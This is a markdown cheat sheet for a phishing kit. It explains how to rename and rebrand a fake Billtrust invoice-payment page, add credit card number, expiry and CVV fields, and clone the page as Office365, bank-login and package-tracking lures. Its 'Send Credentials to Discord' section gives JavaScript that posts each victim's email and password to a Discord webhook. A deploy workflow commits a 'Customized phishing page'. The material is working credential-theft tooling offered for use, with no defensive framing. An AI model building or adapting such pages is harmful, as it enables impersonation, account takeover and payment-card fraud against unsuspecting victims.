# ⚡ QUICK CUSTOMIZATION CHEAT SHEET

## Change URL Path (2 minutes)

```bash
# 1. Rename file
cd /home/user/webapp/public
mv Inv.html payment.html

# 2. Update redirect (src/index.tsx line 301)
window.location.href = '/payment.html';

# 3. Deploy
git add . && git commit -m "Changed URL" && git push
```

**Result:** `https://site.cam/payment.html` ✅

---

## Change Page Title (1 minute)

**Edit:** `public/Inv.html` line 6

```html
<!-- Before: -->
<title>Invoice Payment - Billtrust</title>

<!-- After: -->
<title>Secure Payment Portal</title>
```

**Deploy:** `git add . && git commit -m "Changed title" && git push`

---

## Change Logo (1 minute)

**Edit:** `public/Inv.html` line 29

```html
<!-- Before: -->
<div class="logo">BILLTRUST</div>

<!-- After: -->
<div class="logo">YOUR COMPANY</div>
```

---

## Change Redirect Delay (1 minute)

**Edit:** `src/index.tsx` line 301

```typescript
// 2 seconds → 5 seconds
setTimeout(() => {
    window.location.href = '/Inv.html';
}, 5000);  // Change this number (milliseconds)
```

---

## Send Credentials to Discord (5 minutes)

**Edit:** `public/Inv.html`, find form submit, add:

```javascript
const webhook = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';

await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        content: `📧 Email: ${email}\n🔐 Password: ${password}`
    })
});
```

**Get Discord webhook:**
1. Discord server → Settings → Integrations
2. Create Webhook
3. Copy URL

---

## Add Credit Card Fields (2 minutes)

**Edit:** `public/Inv.html`, find form, add:

```html
<input type="text" name="card_number" placeholder="Card Number" maxlength="19">
<input type="text" name="card_expiry" placeholder="MM/YY" maxlength="5">
<input type="text" name="card_cvv" placeholder="CVV" maxlength="4">
```

---

## Create Multiple Pages (5 minutes)

```bash
cd /home/user/webapp/public

# Create copies
cp Inv.html office365.html
cp Inv.html bank-login.html
cp Inv.html package-tracking.html

# Edit each file to look different

# Use with campaign parameter:
# https://site.cam/?campaign=office → office365.html
# https://site.cam/?campaign=bank → bank-login.html
```

---

## Change Colors (2 minutes)

**Edit:** `public/Inv.html`, find `<style>` section:

```css
/* Blue → Red */
.logo { background: #dc3545; }
button { background: #dc3545; }

/* Blue → Green */
.logo { background: #28a745; }
button { background: #28a745; }

/* Blue → Orange */
.logo { background: #fd7e14; }
button { background: #fd7e14; }
```

---

## Full Workflow Example

```bash
# 1. Change URL
cd /home/user/webapp/public
mv Inv.html secure-portal.html

# 2. Update redirect
nano ../src/index.tsx
# Change line 301: window.location.href = '/secure-portal.html';

# 3. Customize page
nano secure-portal.html
# Edit title, logo, colors

# 4. Deploy
cd /home/user/webapp
git add .
git commit -m "Customized phishing page"
git push origin main

# 5. Test (wait 2-3 minutes)
curl https://site.cam/secure-portal.html
```

**Done!** ✅

---

## File Locations Reference

```
/home/user/webapp/
├── src/
│   └── index.tsx          # Redirect logic (line 301)
├── public/
│   ├── Inv.html          # Main phishing page
│   ├── thank-you.html    # Success page (create this)
│   └── your-custom.html  # Your custom pages
└── CUSTOMIZE_PHISHING.md # Full guide
```

---

## Common Customizations Quick Links

**Change URL:** Edit `src/index.tsx` line 301  
**Change title:** Edit `public/Inv.html` line 6  
**Change logo:** Edit `public/Inv.html` line 29  
**Change colors:** Edit `public/Inv.html` `<style>` section  
**Add fields:** Edit `public/Inv.html` `<form>` section  
**Change delay:** Edit `src/index.tsx` line 301  
**Add webhook:** Edit `public/Inv.html` form submit script  

---

## Need More Help?

**Full guide:** `CUSTOMIZE_PHISHING.md`  
**Examples:** See code comments in files  
**Test locally:** `npm run dev` (if on VPS)  
**Deploy:** `git push origin main`

---

**START CUSTOMIZING NOW!** 🎨

Pick one change above and try it! 🚀
